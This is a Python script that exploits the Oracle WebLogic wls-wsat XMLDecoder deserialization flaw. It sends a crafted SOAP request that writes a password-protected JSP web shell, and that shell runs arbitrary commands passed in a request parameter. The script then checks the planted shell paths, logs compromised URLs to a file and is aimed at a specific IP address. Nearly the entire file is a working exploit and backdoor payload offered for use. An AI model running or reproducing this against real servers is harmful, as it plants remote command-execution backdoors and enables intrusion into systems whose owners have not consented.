#coding:utf-8
import requests
import threading
import time
import Queue

shell_path_list = ['bea_wls_internal/9j4dqk/war/wgic.jsp','wls-wsat/54p17w/war/wgic.jsp']
#shell_content = '201710271'
shell_content = '''201710271
<![CDATA[<%   if("v".equals(request.getParameter("pwd"))){  
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();  
        int a = -1;  
        byte[] b = new byte[2048];  
        out.print("<pre>");  
        while((a=in.read(b))!=-1){  
            out.println(new String(b));  
        }  
        out.print("</pre>");  
    } %>]]>
'''
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110',
           'Content-Type':'text/xml'
    }

#url = 'http://129.144.21.121:7001'

def verify(url):
    for shell_path in shell_path_list:
        try:
            #print shell_path
            data = '''
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java><java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/'''+ shell_path + '''</string><void method="println"><string>'''+ shell_content +'''</string>
                </void><void method="close"/></void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
            '''
            url1 =  url +  '/wls-wsat/CoordinatorPortType'
            #print url1
            requests.post(url1,data=data,headers=headers,timeout=0.5)
        except:
            continue
    try:
        r1 = requests.get(url + '/bea_wls_internal/wgic.jsp' ,headers = headers,timeout=0.5)
        if '201710271' in r1.content:
            print 'Success:%s/bea_wls_internal/wgic.jsp'%(url)
            with open('success.txt','a') as f:
                f.write(url + '/bea_wls_internal/wgic.jsp\n')
        r2 = requests.get(url + '/wls-wsat/wgic.jsp' ,headers = headers,timeout=0.5)
        if '201710271' in r2.content:
            print 'Success:%s/wls-wsat/wgic.jsp'%(url)
            with open('success.txt','a') as f:
                f.write(url + '/wls-wsat/wgic.jsp\n')
    except:
        pass

verify('http://10.208.217.75:7001/')

